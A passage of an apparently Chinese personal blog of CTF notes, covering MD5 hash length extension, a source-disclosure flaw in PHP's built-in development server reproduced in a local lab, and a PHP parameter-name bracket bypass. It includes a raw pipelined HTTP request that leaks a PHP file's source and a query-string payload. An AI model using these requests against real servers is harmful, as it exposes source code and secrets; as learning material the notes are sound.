<p>Hash长度拓展攻击利用了特定哈希算法的漏洞，使攻击者能够根据已知的哈希值和原始数据的部分内容生成一个新的有效哈希值，而无需知道原始数据的其余部分。攻击者能够在已知哈希值的基础上构造出一个新的哈希值，看起来就像是在已知数据后附加了其他内容，并且新的哈希值也是有效的。</p>
</blockquote>
<h2 id="MD5加密原理"><a href="#MD5加密原理" class="headerlink" title="MD5加密原理"></a>MD5加密原理</h2><p>先放图，（虽然上了密码学课</p>
<p><img src="/2023/02/15/Notes/image-20230904224135156.png" alt="image-20230904224135156"></p>
<p><img src="/2023/02/15/Notes/image-20230904223823110.png" alt="image-20230904223823110"></p>
<p>总共可以分为，</p>
<blockquote>
<ol>
<li>把消息分为n个分组</li>
<li>对最后一个消息分组进行填充</li>
<li>和输入量进行运算，运算结果位下一个分组的输入量</li>
<li>输出最终结果</li>
</ol>
</blockquote>
<p>MD5算法输入的消息以<code>512bit</code>的分组为单位处理，共<code>64byte</code></p>
<p>然后对每个分组进行加密，前一次的加密的结果会作为这一次加密的输入，最后一次加密的结果即为最终的MD5值。</p>
<p><code>不足64字节的分组</code>需要进行<code>补位</code>，也就是字节填充。</p>
<blockquote>
<p>补位原则：首先将需要hash的字符串进行分组，即<code>字符串长度</code>（以字节为单位）整除64，最后一组<code>不足56字节</code>的进行字节填充。填充的第一个字节为<code>0x80</code>，其他均为<code>0x00</code>。剩下的<code>8个字节</code>(64bit)用来表示原字符串的长度。</p>
</blockquote>
<hr>
<p>拿<code>*CTF 2023 jwt2struts</code>题目为例</p>
<blockquote>
<p>$_COOKIE[“digest”] 要求为 md5($salt.$username.$password)<br>要满足$username &#x3D;&#x3D;&#x3D; “admin” &amp;&amp; $password !&#x3D; “root”<br>&#x2F;&#x2F;$salt &#x3D; XXXXXXXXXXXXXX &#x2F;&#x2F; the salt include 14 characters<br>&#x2F;&#x2F;md5($salt.”adminroot”)&#x3D;e6ccbf12de9d33ec27a5bcfb6a3293df</p>
</blockquote>
<p>这个是提示，发现我们知道了<code>md5($salt.&quot;adminroot&quot;)</code>的值，也就是我们的目的MD5值，再加上我们想要加密的字符串，<code>salt的长度已知</code>，后段的<code>adminroot</code>已知</p>
<p>符合情形，</p>
<blockquote>
<ol>
<li>已知需要加密的字段（如，已知adminroot）</li>
<li>已知salt的长度，但不知道具体值</li>
</ol>
</blockquote>
<p>可以直接用工具<code>hashdump</code>即可</p>
<h1 id="php-lt-x3D-7-4-21-内置服务器任意文件读取"><a href="#php-lt-x3D-7-4-21-内置服务器任意文件读取" class="headerlink" title="php&lt;&#x3D;7.4.21 内置服务器任意文件读取"></a>php&lt;&#x3D;7.4.21 内置服务器任意文件读取</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.projectdiscovery.io/php-http-server-source-disclosure/">https://blog.projectdiscovery.io/php-http-server-source-disclosure/</a></p>
</blockquote>
<p>羊城杯遇到的知识点，在<code>php&lt; = 7.4.21</code>任意文件读取</p>
<p>开始看到这个页面其实很陌生</p>
<p><img src="/2023/02/15/Notes/image-20230904170556437.png" alt="image-20230904170556437"></p>
<p>和常见的<code>apache</code>以及<code>nginx</code>的404都不一样</p>
<p>搜了一下发现是php内置服务器搭建的网站</p>
<p><img src="/2023/02/15/Notes/image-20230904205656790.png" alt="image-20230904205656790"></p>
<blockquote>
<p>ps.后面看其他人wp才知道，可以扫描网站的，怕被封号没扫，网站下有个<code>start.sh</code>，里面就给出了网站的<code>启动命令</code>和<code>flag</code>的位置，结果我还取解密看重定向响应，麻了</p>
</blockquote>
<p>当然题目是反序列化读文件，但是我们得先读取到源码内容，</p>
<p>网站中想要读取php的源码一般是<code>rce</code>和<code>文件包含</code>才能得到，但是题目只给了<code>404</code>页面，以及有个待读取源码的<code>p0p.php</code>文件</p>
<p>利用php内置服务器而不靠中间件搭建的网站，真的安全吗？</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 0.0.0.0:8888</span><br></pre></td></tr></table></figure>

<p>利用万能ai给出文章网站</p>
<p><img src="/2023/02/15/Notes/image-20230904171442398.png" alt="image-20230904171442398"></p>
<p>在php&lt;&#x3D;7.4.21版本中，利用php内置服务器搭建的网站存在任意文件读取，但也只是只能读取该命令执行所在目录下的文件，不过正好可以读出<code>p0p.php</code>的内容</p>
<p>但是题目关了，知识点，我在<code>wsl</code>复现一下</p>
<hr>
<blockquote>
<p>环境：</p>
<p><code>wsl2 系统kali</code></p>
<p><code>php版本 7.0.33</code></p>
</blockquote>
<p><img src="/2023/02/15/Notes/image-20230904174618539.png" alt="image-20230904174618539"></p>
<p>我在命令启动的目录下生成了一个<code>flag.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag&#123;test&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag_is_here&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>正常访问只能看到<code>flag_is_here</code></p>
<p><img src="/2023/02/15/Notes/image-20230904174602793.png" alt="image-20230904174602793"></p>
<p>但是看不到<code>flag&#123;test&#125;</code></p>
<p>但是通过构造特殊结构的请求体就可以访问成功，</p>
<blockquote>
<p>GET &#x2F;flag.php HTTP&#x2F;1.1<br>Host: 172.28.31.86:8888</p>
<p>GET &#x2F; HTTP&#x2F;1.1</p>
</blockquote>
<p><img src="/2023/02/15/Notes/image-20230904174755615.png" alt="image-20230904174755615"></p>
<p>发现<code>flag.php</code>的内容被完全显示出来，而服务器中的访问数据只是访问了首页</p>
<p><img src="/2023/02/15/Notes/image-20230904175028098.png" alt="image-20230904175028098"></p>
<blockquote>
<p>原理有点绕，可以看看<code>7.4.21</code>和<code>7.4.22</code>的区别分析一下</p>
</blockquote>
<h2 id="7-4-21-lt-x3D-版本-lt-x3D-8-0-2复现"><a href="#7-4-21-lt-x3D-版本-lt-x3D-8-0-2复现" class="headerlink" title="7.4.21&lt;&#x3D;版本&lt;&#x3D;8.0.2复现"></a>7.4.21&lt;&#x3D;版本&lt;&#x3D;8.0.2复现</h2><p>当然并不是高版本就不行了，，其实高版本也存在这个漏洞</p>
<p>在低于<code>8.0.2</code>版本的<code>php</code>，如果想要复现这个漏洞需要满足一个条件，就是命令执行所在的目录下必须没有<code>index.php</code>文件才可以实现</p>
<h3 id="低版本有index-php情况"><a href="#低版本有index-php情况" class="headerlink" title="低版本有index.php情况"></a>低版本有<code>index.php</code>情况</h3><p>我们先在<code>7.0.33</code>版本下生成一个<code>index.php</code>文件，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;welcome index!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/15/Notes/image-20230904180249243.png" alt="image-20230904180249243"></p>
<p>发现在低版本下如果在目录执行的目录下有<code>index.php</code>，也无法进行任意文件内容的读取</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<p>想要实现php内置服务器任意文件读取，首先是要满足版本要求，其次需要满足，对方执行搭建内置服务器的目录下没有index.php文件，才可以实现任意文件内容的一个读取，不过一般的开发者都不会把php内置服务器搭建的网站挂在公网上，不过这个漏洞也是一个值得考虑的一个利用点</p>
</blockquote>
<h1 id="php-lt-8非法参数名传参"><a href="#php-lt-8非法参数名传参" class="headerlink" title="php &lt; 8非法参数名传参"></a>php &lt; 8非法参数名传参</h1><p>当传参<code>$_REQUEST[&#39;mo chu.&#39;]</code></p>
<p>参数名中含有<code>空格</code>和<code>点</code>，可以看到当我们传入<code>?mo chu. =xxx</code>时，传入的参数名中点<code>.</code>和<code>空格</code>都被替换为了下划线<code>_</code>，这样的参数名确实无法传参。</p>
<p>当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，也就是说如果中括号<code>[</code>出现在前面，那么中括号<code>[</code>还是会被转换成下划线<code>_</code>，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code>。</p>
<p>Payload如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?mo[chu.<span class="number">7</span>=xxx</span><br></pre></td></tr></table></figure>

<p>利用了如果传入的参数名出现了中括号<code>[</code>只替换一次的原理，使得传入的参数为：<code>mo_chu.7</code></p>
<p>但是如果出现了多个 <code>[</code>，就无法替换了</p>
<p>在PHP8中这种转换错误被修复了，传入的参数名中非法字符一律全部转换为了下划线</p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/daily/">daily</a></div><div class="post_share"><div class="social-share" data-image="/img/21.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/03/10/2022hxp/" title="hxp2022 wp"><i class="fas fa-chevron-left prev-icon"><div class="prev-label">Previous Post</div></i></a><div class="pagination-card"><img class="prev-cover" src="/img/38.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">hxp2022 wp</div></div></div></div><div class="next-post pull-right"><a href="/2023/02/15/htb(Endgames)/" title="htbのEndgames"><i class="fas fa-chevron-right next-icon"><div class="next-label">Next Post</div></i></a><div class="pagination-card"><img class="next-cover" src="/img/9.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">htbのEndgames</div></div></div></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2022/05/31/Noteless/" title="web基础随记"><img class="cover" src="/img/20.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2023-08-06</div><div class="title">web基础随记</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pearcmd-php%E7%9A%84%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8"><span class="toc-text">pearcmd.php的巧妙利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#libmbfl%E6%89%93%E5%88%86"><span class="toc-text">libmbfl打分</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomcat%E4%BB%A5-%E4%B8%80%E7%A7%8D%E5%A5%87%E6%80%AA%E7%9A%84%E6%96%B9%E5%BC%8F%E8%BF%9B%E8%A1%8C%E8%A7%84%E8%8C%83%E5%8C%96"><span class="toc-text">Tomcat以;一种奇怪的方式进行规范化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AFXSS%E3%80%90%E9%92%88%E5%AF%B9%E4%BA%8E%E5%8A%A8%E6%80%81PDF%E3%80%91"><span class="toc-text">服务器端XSS【针对于动态PDF】</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E7%A8%B3%E5%AE%9A%E7%9A%84shell"><span class="toc-text">获得稳定的shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#T3%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB"><span class="toc-text">T3协议的反序列化攻击</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%85%AC%E7%BD%91%E6%B5%8B%E8%AF%95"><span class="toc-text">记第一次公网测试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#file-b%E8%A7%A3%E6%9E%90-%E5%90%8E%E5%86%85%E5%AE%B9%E6%98%BE%E7%A4%BA"><span class="toc-text">file -b解析#!后内容显示</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#strace%E5%91%BD%E4%BB%A4"><span class="toc-text">strace命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mysql%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="toc-text">Mysql主从复制</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%9C%BA%E3%80%90%E4%B8%BB%E3%80%91"><span class="toc-text">攻击机【主】</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%89%A7%E8%A1%8C%E3%80%90%E4%BB%8E%E3%80%91"><span class="toc-text">环境执行【从】</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#windows%E4%B8%8Elinux%E5%AF%B9-%E7%9A%84%E4%B8%8D%E5%90%8C%E8%A7%A3%E6%9E%90%E4%B8%8E%E9%99%90%E5%88%B6"><span class="toc-text">windows与linux对;的不同解析与限制</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Flask%E7%9A%84Debug%E6%A8%A1%E5%BC%8F"><span class="toc-text">Flask的Debug模式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8debug%E5%8A%9F%E8%83%BD%E8%83%BD%E5%B9%B2%E5%95%A5"><span class="toc-text">利用debug功能能干啥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PIN-%E7%A0%81%E5%A6%82%E4%BD%95%E7%94%9F%E6%88%90"><span class="toc-text">PIN 码如何生成</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95"><span class="toc-text">生成算法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8"><span class="toc-text">反序列化逃逸</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#session%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">session进行文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#session-upload-progress%E4%BD%9C%E7%94%A8%EF%BC%9F"><span class="toc-text">session.upload_progress作用？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB"><span class="toc-text">hash长度扩展攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MD5%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86"><span class="toc-text">MD5加密原理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php-lt-x3D-7-4-21-%E5%86%85%E7%BD%AE%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">php&lt;&#x3D;7.4.21 内置服务器任意文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#7-4-21-lt-x3D-%E7%89%88%E6%9C%AC-lt-x3D-8-0-2%E5%A4%8D%E7%8E%B0"><span class="toc-text">7.4.21&lt;&#x3D;版本&lt;&#x3D;8.0.2复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%8E%E7%89%88%E6%9C%AC%E6%9C%89index-php%E6%83%85%E5%86%B5"><span class="toc-text">低版本有index.php情况</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php-lt-8%E9%9D%9E%E6%B3%95%E5%8F%82%E6%95%B0%E5%90%8D%E4%BC%A0%E5%8F%82"><span class="toc-text">php &lt; 8非法参数名传参</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2022.5 - 2023 By Ttoc</div><div class="footer_custom_text">This blog is mainly used for me to learn and record,wish it can help you too.</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">繁</button><a class="icon-V hidden" onclick="switchNightMode()" title="Switch Between Light And Dark Mode"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script src="/js/sun_moon.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show","#web_bg",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script></div></body></html><div id="web_bg"></div>